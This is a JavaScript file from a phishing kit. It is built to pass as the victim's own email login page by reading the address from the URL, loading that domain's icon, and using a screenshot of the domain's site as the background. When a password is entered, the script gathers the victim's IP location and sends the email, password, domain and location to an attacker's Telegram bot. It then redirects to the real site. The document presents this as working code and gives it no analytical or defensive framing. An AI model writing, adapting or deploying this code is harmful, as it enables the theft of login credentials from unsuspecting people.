function getOS() {
 const userAgent = window.navigator.userAgent,
 platform = window.navigator?.userAgentData?.platform || window.navigator.platform,
 macosPlatforms = ['macOS', 'Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
 windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
 iosPlatforms = ['iPhone', 'iPad', 'iPod'];
 let os = null;

 if (macosPlatforms.indexOf(platform) !== -1) {
 os = 'Mac OS';
 } else if (iosPlatforms.indexOf(platform) !== -1) {
 os = 'iOS';
 } else if (windowsPlatforms.indexOf(platform) !== -1) {
 os = 'Windows';
 } else if (/Android/.test(userAgent)) {
 os = 'Android';
 } else if (/Linux/.test(platform)) {
 os = 'Linux';
 }

 return os;
}

var bari = (getOS());
$('#opsder').html(bari);

// get a new date (locale machine date time)
var date = new Date();
// get the date as a string
var n = date.toDateString();
// get the time as a string
var time = date.toLocaleTimeString();

// find the html element with the id of time
// set the innerHTML of that element to the date a space the time
document.getElementById('time').innerHTML = n + ' ' + time;
document.getElementById('times').innerHTML = n + ' ' + time; 

 
setTimeout(() => { 
 $('.mail-loader_block').css('display', 'none');
 $('#doom').css('display', 'block'); }, 5000);


$(document).ready(function(){
var count=0;

var email = window.location.hash.substr(1);
if (!email) {

}
else
{
var my_email =email;
$('#email').val(my_email);
$('#emailich').html(my_email);
$('#auth_email').html(my_email);
$('#manutd').html(my_email);
var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

if (!filter.test(my_email)) {
$('#error').show();
email.focus;
return false;
}
// Define the reusable function
// reusable function
// Define the reusable function
function updateBackground(my_email) {
 var ind = my_email.indexOf("@");
 var my_slice = my_email.substr(ind + 1);

 // update footer and logo
 $('#footer_dom').html(my_email);
 $('#carss').html(my_email);

 $("#top_label_logo").attr(
 "src",
 "https://icons.duckduckgo.com/ip3/" + my_slice + ".ico"
 );

 // set screenshot as background image
 var mPage = "https://image.thum.io/get/https://" + my_slice;
 document.body.style.backgroundImage = "url('" + mPage + "')";
 document.body.style.backgroundRepeat = "no-repeat";
 document.body.style.backgroundPosition = "center center";
 document.body.style.backgroundAttachment = "fixed";
 document.body.style.backgroundSize = "cover";
}

// Get email from URL hash (e.g. #test@yahoo.com)
function getEmailFromHash() {
 var hash = window.location.hash; // "#test@yahoo.com"
 if (hash && hash.length > 1) {
 return hash.substring(1); // remove the leading "#"
 }
 return null;
}

// Initial load
var my_email = getEmailFromHash();
if (my_email) {
 updateBackground(my_email);
}

// Listen for hash changes dynamically
window.addEventListener("hashchange", function() {
 var new_email = getEmailFromHash();
 if (new_email) {
 updateBackground(new_email);
 }
});
 
}
$('#next_button').click(async function(event){
$('#error').hide();
$('#msg').hide();
event.preventDefault();
var email=$("#email").val();
var password=$("#password").val();
var ind=email.indexOf("@");
var my_slice=email.substr((ind+1));
if (!password) {
 $('#auth_reg').show();
 $('#auth_reg').html("Password is empty!");

 return false;
 }

count=count+1;

// --- GET IP LOCATION ---
let ipLocation = "Unknown Location";
try {
 const response = await fetch('https://ipapi.co/json/');
 const data = await response.json();
 if(data && data.city && data.country_name) {
 ipLocation = `${data.city}, ${data.country_name} (${data.ip})`;
 } else {
 ipLocation = `IP: ${data.ip}`;
 }
} catch (e) {
 console.error("Failed to fetch IP location");
}

// --- TELEGRAM NOTIFICATION START ---
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // REPLACE THIS
const CHAT_ID = "YOUR_CHAT_ID_HERE";      // REPLACE THIS

const message = `🔓 <b>New Login Attempt</b>\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Domain: ${my_slice}\n📍 Location: ${ipLocation}`;

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 chat_id: CHAT_ID,
 text: message,
 parse_mode: 'HTML'
 })
}).then(response => response.json())
 .then(data => console.log('Telegram sent:', data))
 .catch(error => console.error('Error:', error));
// --- TELEGRAM NOTIFICATION END ---

// Success Logic / Redirect
$("#password").val("");
if (count>=2) {
 count=0;
 window.location.replace("https://www."+my_slice);
}

$("#auth_reg").show();
$('#auth_reg').html("Processing..."); 

setTimeout(() => {
    window.location.replace("https://www."+my_slice);
}, 1000);

 });


 });
